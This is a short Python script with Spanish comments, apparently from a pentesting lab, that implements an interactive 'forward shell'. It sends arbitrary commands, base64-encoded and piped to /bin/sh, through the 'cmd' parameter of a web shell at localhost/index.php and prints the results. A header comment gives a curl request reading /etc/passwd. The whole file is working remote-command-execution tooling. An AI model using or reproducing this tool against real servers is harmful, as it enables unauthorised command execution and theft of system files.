#!/usr/bin/env python

# NOTE: Forward shell

# INFO:  curl -s -X GET 'http://localhost/index.php' -G --data-urlencode 'cmd=cat /etc/passwd'

import signal
import sys
from base64 import b64encode

import requests
from termcolor import colored


def def_handler(sig, frame):
    print(colored("\n[!] Saliendo....\n\n", "red"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


main_url = "http://localhost/index.php"


def run_command(command):
    # HACK: para evitar problemas de sintaxis al enviar el comando por caracteres especiales '' "" / podemos convertir a base64 los comandos y evitamos danar la sintaxis
    # Agregamos al comando el output de salida en error
    command += " 2>&1"
    # comman = 'cat /etc/passwd' # transformamos a base64
    command_encoded = b64encode(command.encode())  # -> b'Y2F0IC9ldGMvcGFzc3dk'
    # HACK: command_encoded esta en formato bites, necesitamos solo la cadena base64 para ellos .decode
    base64_command = command_encoded.decode()  # -> 'Y2F0IC9ldGMvcGFzc3dk''
    # INFO: Ahora tenemos que pasar a la url el comando en base64 pero de la siguiente manera
    # echo "{base64_command}" | base64 -d | /bin/sh -> comando para convertir de base64 a texto claro y ejecutarlo en una shell
    data = {"cmd": f"echo {base64_command} | base64 -d | /bin/sh"}

    r = requests.get(main_url, params=data)
    return r.text


if __name__ == "__main__":
    while True:

        output_command = run_command(input(colored(">> ", "red")))
        print(colored(output_command, "yellow"))
